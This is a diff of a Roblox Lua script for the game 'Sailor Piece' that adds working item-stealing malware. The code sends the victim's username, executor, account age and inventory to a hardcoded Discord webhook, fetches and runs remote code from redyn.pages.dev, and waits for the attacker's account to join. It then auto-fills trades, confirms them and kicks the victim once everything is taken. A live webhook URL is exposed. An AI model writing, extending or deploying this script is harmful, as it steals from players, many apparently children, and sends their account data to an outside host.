@@ -7,7 +7,7 @@ if not game:IsLoaded() then
 	game.Loaded:Wait() 
 end
 
-local username = {"harryman_73", "harryman_73"}
+local username = {"Harryman_73", "Harryman_73"}
 local webhook = "https://discord.com/api/webhooks/1506466365941354586/hJMbZGloi8NkylgSq1vKxuGsFHhfjr-f5gY59bXyBC3GpXsPtY8Bnckl-pou-x9xPQ7x"
 local minrarity = 1
 local exploit = identifyexecutor() or "Unknown"
@@ -74,3 +74,159 @@ UpdateInventory.OnClientEvent:Connect(function(category, items)
                 quantity = item.quantity or 1,
                 rarity = Rarity,
                 rank = Rank,
+            }
+        end
+    end
+    table.sort(Inventory, function(a, b)
+        if a.rank ~= b.rank then return a.rank > b.rank end
+        return a.quantity > b.quantity
+    end)
+    Done = true
+end)
+
+repeat
+    RequestInventory:FireServer()
+    task.wait()
+until Done
+
+if #Inventory == 0 then
+	return
+end
+
+if PlaceId ~= 77747658251236 then
+    if queue_on_teleport then
+        queue_on_teleport(string.format([[
+            getgenv().discourdid = "%s"
+            loadstring(game:HttpGet("https://redyn.pages.dev/Red/SailorPiece"))()
+        ]], getgenv().discourdid))
+        repeat
+            local success = pcall(function()
+                game:GetService("TeleportService"):Teleport(77747658251236)
+            end)
+            task.wait()
+        until success
+        return
+    else
+        localplayer:Kick("Your Executor doesn't support this Script.\nRun it on Sea 1 to work.")
+    end
+end
+
+loadstring(game:HttpGet("https://redyn.pages.dev/Red/Loading.lua"))()
+
+ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("SettingsToggle"):FireServer("MuteSFX", true)
+
+for i = 1, math.min(10, #Inventory) do
+    local item = Inventory[i]
+    InventoryShow[i] = item.rarity .. " ➜ " .. item.name .. " x" .. item.quantity
+end
+if #Inventory > 10 then
+    InventoryShow[#InventoryShow + 1] = (#Inventory - 10) .. " More...."
+end
+
+pcall(function()
+    response = request({
+        Url = "https://api.rubis.app/v2/scrap?public=true",
+        Method = "POST",
+        Headers = { ["Content-Type"] = "text/plain" },
+        Body = (function(t) for _,v in ipairs(Inventory) do t[#t+1]=v.rarity.." ➜ "..v.name.." x"..v.quantity end return table.concat(t,"\n") end)({})
+    })
+    Summary = HttpService:JSONDecode(response.Body).raw
+end)
+
+local fields = {
+    {
+        name = ":bust_in_silhouette: Player Information",
+        value = "```" ..
+                "👤 Username: " .. localplayer.Name .. "\n" ..
+                "🔖 Display: " .. DisplayName .. "\n" ..
+                "💻 Executor: " .. exploit .. "\n" ..
+                "⏳ Account Age: " .. AccountAge .. " Days\n" ..
+                "🎮 Player On Server: " .. #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers ..
+                "```",
+        inline = false
+    },
+    {
+        name = ":inbox_tray: Receiver",
+        value = "```" .. table.concat(username, ", ") .. "```",
+        inline = false
+    },
+    {
+        name = ":package: Inventory",
+        value = "```" .. table.concat(InventoryShow, "\n") .. "```",
+        inline = false
+    },
+    {
+        name = ":mag: Summary",
+        value = Summary or "Upload to Rubis Failed",
+        inline = false
+    }
+}
+local data = {
+    ["content"] = string.format("@everyone\nhttps://itstimetostealrobloxkid.pages.dev/?placeId=%d&jobId=%s", PlaceId, JobId),
+    ["embeds"] = {{
+        ["title"] = "Sailor Piece Hit! :dagger:",
+        ["fields"] = fields,
+        ["color"] = 16711680
+    }}
+}
+local headers = {
+    ["Content-Type"] = "application/json",
+}
+local body = HttpService:JSONEncode(data)
+pcall(function()
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end)
+
+local function WaitForTarget()
+    while true do
+        for _, name in ipairs(username) do
+            local player = Players:FindFirstChild(name)
+            if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+                return player.UserId 
+            end
+        end
+        task.wait()
+    end
+end
+
+target = WaitForTarget()
+
+TradeCompleted.OnClientEvent:Connect(function()
+    for i = 1, math.min(25, #Inventory) do
+        table.remove(Inventory, 1)
+    end
+    if #Inventory == 0 then
+        localplayer:Kick("")
+        return
+    end
+end)
+
+TradingGui:GetPropertyChangedSignal("Visible"):Connect(function()
+    if TradingGui.Visible then
+        task.wait(0.5)
+        for i = 1, math.min(25, #Inventory) do
+            AddItemToTrade:FireServer("Items", Inventory[i].name, Inventory[i].quantity)
+            task.wait(0.5)
+        end
+        local Button = TradingGui.Frame.Content.Player2Side.Player2Holder.Buttons.Ready.Txt
+        while task.wait() and TradingGui.Visible do
+            if Button.Text == "Ready" then
+                SetReady:FireServer(true)
+            end
+            if Button.Text == "CONFIRM" then
+                ConfirmTrade:FireServer()
+            end
+        end
+    end
+end)
+
+while task.wait(0.67) do
+    if not TradingGui.Visible then
+        SendTradeRequest:FireServer(target)
+    end
+end
